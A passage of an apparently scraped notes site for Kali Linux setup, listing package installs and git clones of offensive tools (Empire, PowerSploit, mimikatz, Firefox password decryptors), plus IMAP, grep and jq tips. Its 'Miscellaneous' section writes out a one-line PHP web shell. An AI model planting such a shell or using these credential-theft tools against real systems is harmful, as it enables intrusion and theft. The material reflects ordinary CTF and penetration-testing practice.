/bin/bash glasgow\n</code></pre>"},{"location":"kali_setup_and_installs/#regenerate-default-ssh-keys","title":"Regenerate Default ssh keys","text":"<pre><code># This will move your default keys to the new folder...\ncd /etc/ssh/\nsudo mkdir default_kali_keys\nsudo mv ssh_host_* default_kali_keys/\n\n# Regenerate the keys:\nsudo dpkg-reconfigure openssh-server\n\n# Verify ssh key hashes are different\n# Compare new key hashes to the hashes below\nmd5sum ssh_host_*\nmd5sum default_kali_keys/*\n</code></pre>"},{"location":"kali_setup_and_installs/#configure-git-config","title":"configure git config","text":"<pre><code>git config --global user.name Glasgow\ngit config --global user.email Glasgow@localhost\n</code></pre>"},{"location":"kali_setup_and_installs/#install-anaconda","title":"Install Anaconda:","text":"<p>https://www.anaconda.com/distribution/</p>"},{"location":"kali_setup_and_installs/#removing-anaconda","title":"Removing Anaconda:","text":"<pre><code># remove the install directory\nrm -rf ~/anaconda3\n\n# check bashrc for path modification added by Anaconda3 installer\n# export PATH=\"/root/anaconda3/bin:$PATH\"\n\n# remove hidden files\nrm -rf ~/.condarc ~/.conda ~/.continuum\n</code></pre>"},{"location":"kali_setup_and_installs/#install-atom-text-editor","title":"Install Atom (Text Editor)","text":"<ul> <li>download atom-amd64.deb from https://atom.io/</li> </ul> <p>https://flight-manual.atom.io/getting-started/sections/installing-atom/</p> <pre><code>wget https://atom.io/download/deb\n# Install Atom\nsudo dpkg -i atom-amd64.deb\n# Install Atom's dependencies if they are missing\nsudo apt-get -f install\n</code></pre> <p>Install packages</p> <pre><code>apm install atom-beautify autocomplete-python file-icons highlight-selected minimap minimap-highlight-selected open-recent pdf-view seti-ui sort-lines split-diff\n</code></pre> <p>other I've used in the past:</p> <pre><code>linter\nlinter-flake8\nlinter-ui-default\npython-autopep8\n</code></pre>"},{"location":"kali_setup_and_installs/#install-google-chrome","title":"Install Google Chrome","text":"<ul> <li>https://esc.sh/blog/how-to-install-and-use-google-chrome-on-kali-linux-2-0/</li> <li>https://linuxconfig.org/how-to-install-google-chrome-browser-on-kali-linux</li> </ul> <pre><code>wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\napt-get install gdebi\ngdebi google-chrome-stable_current_amd64.deb\ndpkg -i Downloads/google-chrome-stable_current_amd64.deb\n</code></pre> <p>Note that you can't run this as root Run as another user (may need to use <code>xhost +</code>)</p>"},{"location":"kali_setup_and_installs/#apache-directory-studio","title":"Apache Directory Studio","text":"<p>ApacheDirectoryStudio - LDAP Viewer</p>"},{"location":"kali_setup_and_installs/#ida","title":"IDA","text":"<p>idafree</p>"},{"location":"kali_setup_and_installs/#pycharm","title":"PyCharm","text":"<p>https://www.jetbrains.com/pycharm/download/#section=linux</p>"},{"location":"kali_setup_and_installs/#cutter","title":"Cutter","text":"<p>https://cutter.re/</p>"},{"location":"kali_setup_and_installs/#linux-packages","title":"Linux Packages","text":"<pre><code>sudo apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y\n\n# Install guest additions\n# sudo apt-get install -y virtualbox-guest-x11\n# reboot\n\n# Docker\nsudo apt install docker.io\n\n# Some miscellaneous downloads\nsudo apt-get install ipython3\nsudo apt-get install gobuster -y\nsudo apt-get install jq -y\n\nsudo apt-get install cifs-utils\nsudo apt-get install ncftp\nsudo apt-get install filezilla filezilla-common -y\nsudo apt-get install libreoffice -y\nsudo apt-get install bleachbit -y\nsudo apt-get install steghide -y\nsudo apt-get install mcrypt -y\nsudo apt-get install gimp -y\nsudo apt-get install putty-tools -y\nsudo apt-get install exiftool\nsudo apt install pandoc\nsudo apt install lynx\nsudo apt install lolcat  # add /usr/games to path\n\n\n# buffer overflow stuff\nsudo apt-get install ropper\ngem install one_gadget\n\n# ARM executable\n# apt-get install qemu\n\n#apt-get install tor\n#service tor start # Check additional steps involving \"tor bundle\"\n#apt-get install keepass2 -y\n#apt-get install jd-gui #jar decompiler\n#apt-get install rpcbind -y # for 'rpcinfo'\n#apt-get install nfs-common -y # for 'showmount'\n\n#apt install mono-mcs    # used to compile c# programs\n#apt-get install mingw-w64   # this is to compile windows headers (c/c++)\n#apt-get install gcc-multilib\n#apt-get install redis\n\n# apt-get install thunderbird\n\n# pdf utilities (read from command line; etc.)\n# https://www.howtogeek.com/228531/how-to-convert-a-pdf-file-to-editable-text-using-the-command-line-in-linux/\n# apt-get install poppler-utils\n\napt-get install pdfcrack\n\napt-get install bruteforce-salted-openssl\n\n# apt-get install preload # Preload application (pre-loads binaries and dependancies of most commonly used applications)\n\n# wine is used to run windows exe's\n# dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32\n\n# Download OpenVAS\n# additional info @ https://www.kali.org/penetration-testing/openvas-vulnerability-scanning/\n# apt-get install openvas -y\n# openvas-setup\n\n# apt-get install nbtscan-unixwiz\n\n# Linux Priv Checker (open link in browser for download)\nhttps://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=5&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwinnazY2OLWAhXF7iYKHaBDBZcQFgg9MAQ&amp;url=https%3A%2F%2Fwww.securitysift.com%2Fdownload%2Flinuxprivchecker.py&amp;usg=AOvVaw1aPu93f3PMi0zK8sc0o2ZV\n</code></pre>"},{"location":"kali_setup_and_installs/#github","title":"Github","text":"<pre><code># SecLists is a collection of multiple types of lists used during security assessments. List types include usernames, passwords, URLs, sensitive data grep strings, fuzzing payloads, and many more.\ngit clone https://github.com/danielmiessler/SecLists.git /usr/share/wordlists/SecLists\ncd /usr/share &amp;&amp; ln -s wordlists/SecLists/ seclists  # creates symbolic link (for Reconnoitre)\n### alternatively, just run apt -y install seclists\n\n\n# Reconnoitre (nmap and sparta alternative)\ngit clone https://github.com/codingo/Reconnoitre.git ~/opt/Reconnoitre\n\ngit clone git@github.com:codingo/VHostScan.git ~/opt/VHostScan\n# sed 's/$/.\\%s/g' /usr/share/wordlists/SecLists/Discovery/DNS/fierce-hostlist.txt #&gt; ~/opt/virtual-host-discovery/SecLists_fierce-hostlist.txt\n\n# Python PTY backdoors - full PTY or nothing!\ngit clone https://github.com/infodox/python-pty-shells.git ~/opt/python-pty-shells\n\ngit clone https://github.com/trustedsec/unicorn.git ~/opt/unicorn\n\n# Exploit Suggesters and enumeration\ngit clone https://github.com/sleventyeleven/linuxprivchecker.git ~~/opt/Enumeration/Linux/linuxprivchecker\ngit clone https://github.com/mzet-/linux-exploit-suggester.git ~~/opt/Enumeration/Linux/linux-exploit-suggester\ngit clone https://github.com/NullArray/MIDA-Multitool.git ~~/opt/Enumeration/MIDA-Multitool\ngit clone https://github.com/NullArray/RootHelper.git ~~/opt/Enumeration/RootHelper\ngit clone https://github.com/diego-treitos/linux-smart-enumeration.git ~~/opt/Enumeration/Linux/linux-smart-enumeration\ngit clone https://github.com/carlospolop/linPE.git ~~/opt/Enumeration/Linux/linPE\ngit clone https://github.com/InteliSecureLabs/Linux_Exploit_Suggester.git ~~/opt/Enumeration/Linux/Linux_Exploit_Suggester\ngit clone https://github.com/rebootuser/LinEnum.git ~~/opt/Enumeration/Linux/LinEnum\n\n# Windows privesc\ngit clone https://github.com/pentestmonkey/windows-privesc-check.git ~/opt/Enumeration/Windows/windows-privesc-check\n\n# PowerShell\ngit clone https://github.com/samratashok/nishang.git ~/opt/nishang\ngit clone https://github.com/Mr-Un1k0d3r/ThunderShell.git ~/opt/ThunderShell\ngit clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git ~/opt/PowerLessShell\n\n# NEET - Network Enumeration and Exploitation Tool\ngit clone https://github.com/JonnyHightower/neet.git ~/opt/neet\n\ngit clone https://github.com/alias1/sparty.git ~/opt/sparty\n\n# PowerSploit - A PowerShell Post-Exploitation Framework (some directory lists under PowerSploit/Recon/Dictionaries/)\ngit clone https://github.com/PowerShellMafia/PowerSploit.git ~/opt/PowerSploit\n\n# phpbash\ngit clone https://github.com/Arrexel/phpbash.git ~/opt/phpbash\n\n# RsaCTFTool (to crack weak public rsa key)\n### from github readme:\ngit clone https://github.com/Ganapati/RsaCtfTool.git ~~/opt/RsaCtfTool\nsudo apt-get install libgmp3-dev libmpc-dev\npip3 install -r \"requirements.txt\"\npython3 RsaCtfTool.py\n\n\n# libnum (needed for RsaCTFTool)\ngit clone https://github.com/hellman/libnum.git\npython setup.py install\n\n# ImageTragick - https://github.com/jpeanut/ImageTragick-CVE-2016-3714-RShell.git\n\n# peda\ngit clone https://github.com/longld/peda.git ~/peda\necho \"source ~/peda/peda.py\" &gt;&gt; ~/.gdbinit\necho \"DONE! debug your program with gdb and enjoy\"\n\n# NfSpy - an ID-spoofing NFS client\ngit clone https://github.com/bonsaiviking/NfSpy ~/opt/NfSpy\n\n# Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent.\ngit clone https://github.com/EmpireProject/Empire ~/opt/Empire\nbash ~/opt/Empire/setup/install.sh\n\n# PowerUpSQL: A PowerShell Toolkit for Attacking SQL Server\ngit clone https://github.com/NetSPI/PowerUpSQL ~/opt/PowerUpSQL\n\n# socat-shell\ngit clone https://github.com/cornerpirate/socat-shell.git\n\n# dirsearch - dirsearch is a simple command line tool designed to brute force directories and files in websites.\ngit clone https://github.com/maurosoria/dirsearch.git ~/opt/dirsearch\n\n# firepwd.py, an open source tool to decrypt Mozilla protected passwords\ngit clone https://github.com/lclevy/firepwd.git ~/opt/firepwd\n\n# Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles\ngit clone https://github.com/unode/firefox_decrypt.git ~/opt/firefox_decrypt\n\n# responder\n# git clone https://github.com/SpiderLabs/Responder\napt install responder\n\n# pwnedOrNot (checks for emails in data breaches)\ngit clone https://github.com/thewhiteh4t/pwnedOrNot.git\n\n# mimikatz\ngit clone https://github.com/gentilkiwi/mimikatz.git ~/opt/mimikatz\n\n# virtual-host-discovery\ngit clone https://github.com/jobertabma/virtual-host-discovery.git ~/opt/virtual-host-discovery\n# sed \"s/\\$/\\.\\%s/g\" /usr/share/wordlists/SecLists/Discovery/DNS/fierce-hostlist.txt &gt; ~/opt/virtual-host-discovery/wordlist_2.txt\nsed \"s/\\$/\\.\\%s/g\" /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt &gt; ~/opt/virtual-host-discovery/wordlist_2.txt\n\n# hash_extender\ngit clone https://github.com/iagox86/hash_extender.git ~/opt/hash_extender\n\n# eviler-winrm\ngit clone https://github.com/swarley/eviler-winrm.git ~/opt/eviler-winrm\n\n# ropstar\ngit clone https://github.com/xct/ropstar.git ~/opt/ropstar\n</code></pre>"},{"location":"kali_setup_and_installs/#python-packages","title":"Python Packages","text":"<p>pip installs:</p> <pre><code>pip install pwntools\npip install pyftpdlib\n\npip3 install yq # https://github.com/kislyuk/yq (jq for yaml / xml)\npip3 install awscli\n\n# https://jupyter.org/install\npython3 -m pip install jupyter\n\n#pip3 install stego-lsb # https://github.com/ragibson/Steganography#WavSteg\n#pip3 install stegcracker # https://github.com/Paradoxis/StegCracker\n\npip install termcolor\n\n# oletools\n### https://github.com/decalage2/oletools\n# pip install -U oletools\n\n# truffleHog - Searches through git repositories for secrets, digging deep into commit history and branches. This is effective at finding secrets accidentally committed.\n### https://github.com/dxa4481/truffleHog\n# pip3 install truffleHog\n\npip install pymysql # from craft HTB machine\n\npip3 install web3\n</code></pre> <p>Ruby Gems:</p> <pre><code>## this didn't work well with code blocks -- gem install mdless # markdown viewer in terminal\n</code></pre>"},{"location":"kali_setup_and_installs/#miscellaneous","title":"Miscellaneous","text":"<p>PHP Script for code execution</p> <pre><code># simple script for php code execution\nmkdir ~/opt/php\necho \"&lt;?php echo system(\\$_REQUEST['var']); ?&gt;\" &gt; ~/opt/php/cmd.php\n</code></pre> <p>Rebuild Metasploit Cache (fix slow search)</p> <pre><code>service postgresql start\nupdate-rc.d postgresql enable #to start on reboot\nmsfdb init\nmsfconsole -x \"db_rebuild_cache\"\n</code></pre> <p>Enable Auto-login user</p> <pre><code>leafpad /etc/gdm3/daemon.conf\n--&gt; uncomment these two lines:\n# AutomaticLoginEnable = true\n# AutomaticLogin = root\n</code></pre> <p>Periodic Clean-up</p> <pre><code>#uninstalling unnecessary programs and packages:\nsudo apt-get autoremove -y\n\n#For cleaning cache:\nsudo apt-get clean -y\n</code></pre> <p>to fix SSL_ERROR_RX_RECORD_TOO_LONG error when using burp</p> <ol> <li>within Firefox: about:config</li> <li>security.tls.version.max</li> <li>Update value from 4 (default) to 3</li> </ol> <p>Firefox Add-on: * https://www.wappalyzer.com</p>"},{"location":"kali_setup_and_installs/desktop_environments/","title":"Change Kali Desktop Environment:","text":"<p>If you do not like Gnome 3 in Kali Linux, you can install any Desktop Environment you prefer.</p> <p>Cinnamon:</p> <pre><code>sudo apt-get install kali-defaults kali-root-login desktop-base cinnamon\nsudo update-alternatives --config x-session-manager\n#You will find desktop wallpapers in /usr/share/backgrounds/\n\n#You will have issues while using Cinnamon with root. You will not able change background of your desktop or create a shortcut on the desktop. You should login as normal user.\n</code></pre> <p>Xfce</p> <pre><code>##### install:\nsudo apt-get install kali-defaults kali-root-login desktop-base xfce4 xfce4-places-plugin xfce4-goodies\n\n##### remove:\nsudo apt-get remove xfce4 xfce4-places-plugin xfce4-goodies\n</code></pre> <p>KDE</p> <pre><code>##### install:\nsudo apt-get install kali-defaults kali-root-login desktop-base kde-plasma-desktop\n##### Standard Debian selected packages and frameworks:\nsudo apt-get install kali-defaults kali-root-login desktop-base kde-standard\n##### KDE Full Install:\nsudo apt-get install kali-defaults kali-root-login desktop-base kde-full\n\n##### remove:\nsudo apt-get remove kde-plasma-desktop kde-plasma-netbook kde-standard\n</code></pre> <p>LXDE</p> <pre><code>##### install:\nsudo apt-get install lxde-core lxde kali-defaults kali-root-login desktop-base\n\n##### remove:\nsudo apt-get remove lxde-core lxde\n</code></pre> <p>GNOME</p> <pre><code>##### install:\nsudo apt-get install gnome-core kali-defaults kali-root-login desktop-base\n\n##### remove:\nsudo apt-get remove gnome-core\n</code></pre> <p>MATE</p> <pre><code>##### install:\nsudo apt-get install mate-core mate-desktop-environment-extra mate-desktop-environment-extras\n\n##### remove:\nsudo apt-get remove mate-core\n</code></pre> <p>e17 \u0432</p> <pre><code>##### install:\nsudo apt-get install e17\n\n##### remove:\nsudo apt-get remove e17\n</code></pre> <p>Use the command for selection Desktop Environment:</p> <pre><code>sudo update-alternatives --config x-session-manager\n</code></pre>"},{"location":"kali_setup_and_installs/packages_and_installs/","title":"Packages and Installs","text":""},{"location":"kali_setup_and_installs/packages_and_installs/#linux-packages","title":"Linux Packages","text":"Package install snippet Note bleachbit <code>sudo apt install bleachbit -y</code> cifs-utils <code>sudo apt install cifs-utils</code> Docker <code>sudo apt install docker.io</code> exiftool <code>sudo apt install exiftool</code> filezilla <code>sudo apt install filezilla filezilla-common -y</code> gimp <code>sudo apt install gimp -y</code> gobuster <code>sudo apt install gobuster -y</code> golang <code>sudo apt install golang</code> ipython3 <code>sudo apt install ipython3</code> jq <code>sudo apt install jq -y</code> libreoffice <code>sudo apt install libreoffice -y</code> lolcat <code>sudo apt install lolcat</code> add /usr/games to path ltrace <code>sudo apt install ltrace</code> lynx <code>sudo apt install lynx</code> mcrypt <code>sudo apt install mcrypt -y</code> ncftp <code>sudo apt install ncftp</code> node <code>sudo apt install npm</code> pandoc <code>sudo apt install pandoc</code> pip3 <code>sudo apt install python3-pip</code> plank <code>sudo apt install plank</code> putty <code>sudo apt install putty-tools -y</code> rlwrap <code>sudo apt install rlwrap</code> seclists <code>sudo apt install seclists</code> steghide <code>sudo apt install steghide -y</code> strace <code>sudo apt install strace</code> tree <code>sudo apt install tree</code> venv <code>sudo apt install python3-venv</code> jd-gui javac <code>sudo apt install default-jdk</code> amqp <code>sudo apt install amqp-tools</code>"},{"location":"kali_setup_and_installs/packages_and_installs/#additional-notes","title":"additional notes:","text":"<p>plank setup to autostart</p> <pre><code>[kali-linux-customization](https://www.offensive-security.com/kali-linux/kali-linux-customization/)\n# Add plank to autostart list\n\"Session and Startup\" &gt; add plank to \"autostart\" list\n\n# disable dock shadows\nWindow Manager Tweaks \u2192 Compositor \u2192 disable Show shadows under dock windows\n</code></pre> <pre><code>sudo apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y\n\n# Install guest additions\n# sudo apt-get install -y virtualbox-guest-x11\n# reboot\n\n\n# buffer overflow stuff\nsudo apt-get install ropper\ngem install one_gadget\n\n# ARM executable\n# apt-get install qemu\n\n# apt install tor\n# service tor start # Check additional steps involving \"tor bundle\"\n# apt install keepass2 -y\n# apt install jd-gui #jar decompiler\n# apt install rpcbind -y # for 'rpcinfo'\n# apt install nfs-common -y # for 'showmount'\n# apt install mono-mcs    # used to compile c# programs\n# apt install mingw-w64   # this is to compile windows headers (c/c++)\n# apt install gcc-multilib\n# apt install redis\n# apt-get install thunderbird\n\n# pdf utilities (read from command line; etc.)\n# https://www.howtogeek.com/228531/how-to-convert-a-pdf-file-to-editable-text-using-the-command-line-in-linux/\n# apt-get install poppler-utils\n\n# apt-get install pdfcrack\n# apt-get install bruteforce-salted-openssl\n\n# apt-get install preload # Preload application (pre-loads binaries and dependancies of most commonly used applications)\n\n# wine is used to run windows exe's\n# dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32\n\n# Download OpenVAS\n# additional info @ https://www.kali.org/penetration-testing/openvas-vulnerability-scanning/\n# apt-get install openvas -y\n# openvas-setup\n\n# apt-get install nbtscan-unixwiz\n\n# Linux Priv Checker (open link in browser for download)\nhttps://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=5&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwinnazY2OLWAhXF7iYKHaBDBZcQFgg9MAQ&amp;url=https%3A%2F%2Fwww.securitysift.com%2Fdownload%2Flinuxprivchecker.py&amp;usg=AOvVaw1aPu93f3PMi0zK8sc0o2ZV\n</code></pre> <p>firefox add-on: https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/</p>"},{"location":"kali_setup_and_installs/packages_and_installs/#go-golang","title":"go (golang)","text":"<pre><code>go get github.com/ffuf/ffuf\n\nexport PATH=/home/glasgow/go/bin:$PATH\n</code></pre>"},{"location":"kali_setup_and_installs/packages_and_installs/#github","title":"Github","text":"repo name git clone description SecLists <code>git clone https://github.com/danielmiessler/SecLists.git</code> Word lists for security assessments <pre><code># SecLists is a collection of multiple types of lists used during security assessments. List types include usernames, passwords, URLs, sensitive data grep strings, fuzzing payloads, and many more.\ngit clone https://github.com/danielmiessler/SecLists.git /usr/share/wordlists/SecLists\ncd /usr/share &amp;&amp; ln -s wordlists/SecLists/ seclists  # creates symbolic link (for Reconnoitre)\n### alternatively, just run apt -y install seclists\n\n\n# Reconnoitre (nmap and sparta alternative)\nsudo git clone https://github.com/codingo/Reconnoitre.git ~/opt/Reconnoitre\n\ngit clone git@github.com:codingo/VHostScan.git ~/opt/VHostScan\n# sed 's/$/.\\%s/g' /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt #&gt; ~/opt/virtual-host-discovery/SecLists_fierce-hostlist.txt\n\n# Python PTY backdoors - full PTY or nothing!\ngit clone https://github.com/infodox/python-pty-shells.git ~/opt/python-pty-shells\n\ngit clone https://github.com/trustedsec/unicorn.git ~/opt/unicorn\n\n# Exploit Suggesters and enumeration\ngit clone https://github.com/sleventyeleven/linuxprivchecker.git ~/opt/Enumeration/Linux/linuxprivchecker\ngit clone https://github.com/mzet-/linux-exploit-suggester.git ~/opt/Enumeration/Linux/linux-exploit-suggester\ngit clone https://github.com/NullArray/MIDA-Multitool.git ~/opt/Enumeration/MIDA-Multitool\ngit clone https://github.com/NullArray/RootHelper.git ~/opt/Enumeration/RootHelper\ngit clone https://github.com/diego-treitos/linux-smart-enumeration.git ~/opt/Enumeration/Linux/linux-smart-enumeration\ngit clone https://github.com/carlospolop/linPE.git ~/opt/Enumeration/Linux/linPE\ngit clone https://github.com/InteliSecureLabs/Linux_Exploit_Suggester.git ~/opt/Enumeration/Linux/Linux_Exploit_Suggester\n\n# Windows privesc\ngit clone https://github.com/pentestmonkey/windows-privesc-check.git ~/opt/Enumeration/Windows/windows-privesc-check\n\n# PowerShell\ngit clone https://github.com/samratashok/nishang.git ~/opt/nishang\ngit clone https://github.com/Mr-Un1k0d3r/ThunderShell.git ~/opt/ThunderShell\ngit clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git ~/opt/PowerLessShell\n\n# NEET - Network Enumeration and Exploitation Tool\ngit clone https://github.com/JonnyHightower/neet.git ~/opt/neet\n\ngit clone https://github.com/alias1/sparty.git ~/opt/sparty\n\n# PowerSploit - A PowerShell Post-Exploitation Framework (some directory lists under PowerSploit/Recon/Dictionaries/)\ngit clone https://github.com/PowerShellMafia/PowerSploit.git ~/opt/PowerSploit\n\n# phpbash\ngit clone https://github.com/Arrexel/phpbash.git ~/opt/phpbash\n\n# RsaCTFTool (to crack weak public rsa key)\ngit clone https://github.com/Ganapati/RsaCtfTool.git ~/opt/RsaCtfTool\nsudo apt-get install libgmp3-dev libmpc-dev -y\nsudo pip3 install -r ~/opt/RsaCtfTool/requirements.txt\npython3 RsaCtfTool.py\n\n# libnum (needed for RsaCTFTool)\ngit clone https://github.com/hellman/libnum.git\npython setup.py install\n\n# ImageTragick - https://github.com/jpeanut/ImageTragick-CVE-2016-3714-RShell.git\n\n# peda\ngit clone https://github.com/longld/peda.git ~/peda\necho \"source ~/peda/peda.py\" &gt;&gt; ~/.gdbinit\necho \"DONE! debug your program with gdb and enjoy\"\n\n# NfSpy - an ID-spoofing NFS client\ngit clone https://github.com/bonsaiviking/NfSpy ~/opt/NfSpy\n\n# Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent.\ngit clone https://github.com/EmpireProject/Empire ~/opt/Empire\nbash ~/opt/Empire/setup/install.sh\n\n# PowerUpSQL: A PowerShell Toolkit for Attacking SQL Server\ngit clone https://github.com/NetSPI/PowerUpSQL ~/opt/PowerUpSQL\n\n# socat-shell\ngit clone https://github.com/cornerpirate/socat-shell.git\n\n# dirsearch - dirsearch is a simple command line tool designed to brute force directories and files in websites.\ngit clone https://github.com/maurosoria/dirsearch.git ~/opt/dirsearch\n\n# firepwd.py, an open source tool to decrypt Mozilla protected passwords\ngit clone https://github.com/lclevy/firepwd.git ~/opt/firepwd\n\n# Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles\ngit clone https://github.com/unode/firefox_decrypt.git ~/opt/firefox_decrypt\n\n# responder\n# git clone https://github.com/SpiderLabs/Responder\napt install responder\n\n# pwnedOrNot (checks for emails in data breaches)\ngit clone https://github.com/thewhiteh4t/pwnedOrNot.git\n\n# mimikatz\ngit clone https://github.com/gentilkiwi/mimikatz.git ~/opt/mimikatz\n\n# virtual-host-discovery\ngit clone https://github.com/jobertabma/virtual-host-discovery.git ~/opt/virtual-host-discovery\nsed \"s/\\$/\\.\\%s/g\" /usr/share/wordlists/SecLists/Discovery/DNS/fierce-hostlist.txt &gt; ~/opt/virtual-host-discovery/wordlist_2.txt\n\n# hash_extender\ngit clone https://github.com/iagox86/hash_extender.git ~/opt/hash_extender\n\n# eviler-winrm\ngit clone https://github.com/swarley/eviler-winrm ~/opt/eviler-winrm\ncd eviler-winrm &amp;&amp; bundle config set path 'vendor/bundle' &amp;&amp; bundle install\n</code></pre>"},{"location":"kali_setup_and_installs/packages_and_installs/#python-packages","title":"Python Packages","text":"Package Install snippet Note yq <code>pip3 install yq</code> awscli <code>pip3 install awscli</code> jupyter <code>python3 -m pip install jupyter</code> https://jupyter.org/install jupyterlab <code>pip3 install jupyterlab</code> https://jupyter.org/install <p>pip installs:</p> <pre><code>apt-get update\napt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential\npython3 -m pip install --upgrade pip\npython3 -m pip install --upgrade pwntools\n\npip install pyftpdlib\n\n#pip3 install stego-lsb # https://github.com/ragibson/Steganography#WavSteg\n#pip3 install stegcracker # https://github.com/Paradoxis/StegCracker\n\npip install termcolor\n\n# oletools\n### https://github.com/decalage2/oletools\n# pip install -U oletools\n\n# truffleHog - Searches through git repositories for secrets, digging deep into commit history and branches. This is effective at finding secrets accidentally committed.\n### https://github.com/dxa4481/truffleHog\n# pip3 install truffleHog\n\npip install pymysql # from craft HTB machine\n\npip3 install web3\n</code></pre> <p>Ruby Gems:</p> <pre><code>gem install mdless # markdown viewer in terminal\n</code></pre>"},{"location":"kali_setup_and_installs/packages_and_installs/#pspy-unprivileged-linux-process-snooping","title":"pspy - unprivileged linux process snooping","text":"<p>https://github.com/DominicBreuker/pspy</p> <p>psby.exe</p> <p>runas.exe streams.exe</p> <p>https://github.com/gentilkiwi/mimikatz/releases https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20190512/mimikatz_trunk.zip</p> <p>https://packetstormsecurity.com/files/31140/nc.exe.html (also at /usr/share/windows-binaries/nc.exe)</p>"},{"location":"miscellaneous/docker/","title":"Docker","text":"command description reference <code>docker pull &lt;name&gt;</code> Pull an image or a repository from a registry docker pull <code>docker run -t -i ubuntu /bin/bash</code> run ubuntu container (make sure to do <code>apt-get update</code> in order to install stuff) <code>service docker start</code> Start docker daemon <code>service docker stop</code> Stop docker daemon <code>docker run &lt;container_id&gt;</code> <code>docker attach &lt;container_id&gt;</code> <code>docker ps -a</code> <code>docker images -a</code> <code>docker rmi &lt;image_id&gt;</code> <code>docker container ls -a</code> <code>docker rm &lt;container_id&gt;</code> <code>docker container prune</code> <code>docker system df</code> Show docker disk usage system_df"},{"location":"miscellaneous/email/","title":"Email","text":"<p>Reading email from command line:</p> <p>Using openssl https://tewarid.github.io/2011/05/10/access-imap-server-from-the-command-line-using-openssl.html</p> <pre><code>openssl s_client -connect sneakymailer.htb:993 -crlf\n\ntag login username password\n\ntag LIST \"\" \"*\"\n\ntag select INBOX\n</code></pre> <p>Using telnet:</p> <pre><code>telnet sneakymailer.htb 143\n</code></pre>"},{"location":"miscellaneous/email/#todo-clean-up-email-saving-attachment-downloading","title":"TODO - clean-up email saving / attachment downloading","text":"<p>python:</p> <pre><code>import imaplib\nimport email\n\nhost = \"sneakymailer.htb\"\nusername = \"username\"\npassword = \"password\"\nimap = imaplib.IMAP4_SSL(host)\nimap.login(username, password)\n\nsave_and_open_in_browser = False\n\ndef main():\n    folders = [folder.decode().split('\".\"')[1].strip() for folder in imap.list()[1]]\n\n    for folder in folders:\n        status, messages = imap.select(folder)\n        messages = int(messages[0])\n        print(f\"folder: {folder}\")\n        print(f\"# of messages: {messages}\\n\")\n\n        if messages &gt; 0:\n            print(\"=\"*100)\n            for num in range(messages):\n                get_email(num+1)\n\ndef get_email(num):\n    res, msg = imap.fetch(str(num), \"(RFC822)\")\n    for response in msg:\n        if isinstance(response, tuple):\n            # parse a bytes email into a message object\n            msg = email.message_from_bytes(response[1])\n            # decode the email subject\n            subject = decode_header(msg[\"Subject\"])[0][0]\n            if isinstance(subject, bytes):\n                # if it's a bytes, decode to str\n                subject = subject.decode()\n            # email sender\n            from_ = msg.get(\"From\")\n            print(\"Subject:\", subject)\n            print(\"From:\", from_)\n            # if the email message is multipart\n            if msg.is_multipart():\n                # iterate over email parts\n                for part in msg.walk():\n                    # extract content type of email\n                    content_type = part.get_content_type()\n                    content_disposition = str(part.get(\"Content-Disposition\"))\n                    try:\n                        # get the email body\n                        body = part.get_payload(decode=True).decode()\n                    except:\n                        pass\n                    if content_type == \"text/plain\" and \"attachment\" not in content_disposition:\n                        # print text/plain emails and skip attachments\n                        print(body)\n                    elif \"attachment\" in content_disposition:\n                        # download attachment\n                        filename = part.get_filename()\n                        if filename:\n                            if not os.path.isdir(subject):\n                                # make a folder for this email (named after the subject)\n                                os.mkdir(subject)\n                            filepath = os.path.join(subject, filename)\n                            # download attachment and save it\n                            open(filepath, \"wb\").write(part.get_payload(decode=True))\n            else:\n                # extract content type of email\n                content_type = msg.get_content_type()\n                # get the email body\n                body = msg.get_payload(decode=True).decode()\n                if content_type == \"text/plain\":\n                    # print only text email parts\n                    print(body)\n\n            if content_type == \"text/html\" and save_and_open_in_browser:\n                # if it's HTML, create a new HTML file and open it in browser\n                if not os.path.isdir(subject):\n                    # make a folder for this email (named after the subject)\n                    os.mkdir(subject)\n                filename = f\"{subject[:50]}.html\"\n                filepath = os.path.join(subject, filename)\n                # write the file\n                open(filepath, \"w\").write(body)\n                # open in the default browser\n                webbrowser.open(filepath)\n            print(\"=\"*100)\n</code></pre>"},{"location":"miscellaneous/grep/","title":"Grep","text":"<p>Highlight all non-comments (for logs):</p> <pre><code>grep --color=always '^[^#]*' filename\n\ngrep --color=always '^[^#]*' filename|less -r\n</code></pre> <p>If you like the colorful grep, you can simply <code>export GREP_OPTIONS='--color=auto'</code> in your shell startup script.</p> <p>Change color of grep:</p> <pre><code>export GREP_COLOR='1;32'\n</code></pre>"},{"location":"miscellaneous/jq_syntax/","title":"Jq syntax","text":""},{"location":"miscellaneous/jq_syntax/#filter-to-only-one-key-of-a-json-web-response","title":"filter to only one key of a json web response","text":"<p>Response from curl request</p> <pre><code>curl http://localhost:81/debug\n{\n  \"response\": {\n    \"Expression\": \"2+2\",\n    \"Signature\": \"63b9507a01c14d9b13eebb0af4c1c0042417662b0f38cda4b35a7b6c2b53ef9261b447f5bcd01be64c2db680b80af2424edcfc8feb5aa53c3f5be16aefbf91ed37d1603beb1c62d96f84f86049c85817395ac9cc71fc7fdec98176c5a30938bc\"\n  }\n}\n</code></pre> <p>To get 